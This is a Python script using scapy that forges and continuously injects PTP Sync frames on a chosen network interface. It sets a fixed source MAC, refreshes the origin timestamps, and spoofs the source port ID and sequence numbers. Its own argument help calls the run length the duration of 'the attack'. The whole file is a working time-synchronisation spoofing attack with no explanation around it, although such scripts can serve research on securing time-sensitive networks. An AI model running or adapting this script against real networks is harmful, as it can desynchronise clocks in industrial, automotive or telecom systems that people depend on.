from scapy.all import *
from scapy.all import Ether
from SyncPTP import *
import time
import argparse


sync_ether = Ether()
sync_ether.src = 'c4:5a:b1:3a:1b:4a'
sync_ether.dst = '01:1b:19:00:00:00'
sync_ether.type = 35063

sync_load = b'\x00\x02\x00,\x18\x00\x00\x00\x00\x00\x00\x00\rg\x00\x00\x00\x00\x00\x00\xc4Z\xb1\xff\xff\x80`\x85\x00\x02LN\x00\xfc\x00\x00f2|\xfc\x1dGn\xcc\x00\x00'  

sync_pkt = sync_ether / sync_load
sync_pkt = SyncPTP(sync_pkt)

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--sleep", help="specify the sleep time", type=float)
parser.add_argument("-d", "--duration", help="specify the duration of the attack", type=float)
parser.add_argument("-i", "--interface", help="specify the interface", type=str, default='enp4s0')
parser.add_argument("-p", "--portID", help="specify the source port ID", type=int, default=14)

args = parser.parse_args()

def sendSyn(sync_pkt, duration=None, sleep=None):
    start_time = time.time()
    while True:
        current_time = time.time()
        if duration and current_time - start_time >= duration:
            time.sleep(sleep)
            start_time = time.time()
        current_time = time.time()
        seconds = int(current_time)
        nanoseconds = int((current_time - seconds) * 1e9)
        sync_pkt.new_originTimestampSeconds(seconds)
        sync_pkt.new_originTimestampNanoseconds(nanoseconds)
        sync_pkt.new_SourcePortID(args.portID)

        sync_pkt.Increment_SequenceID(1)
        sendp(sync_pkt.packet, iface= args.interface)
        time.sleep(0.65)


sendSyn(sync_pkt,args.duration, args.sleep)




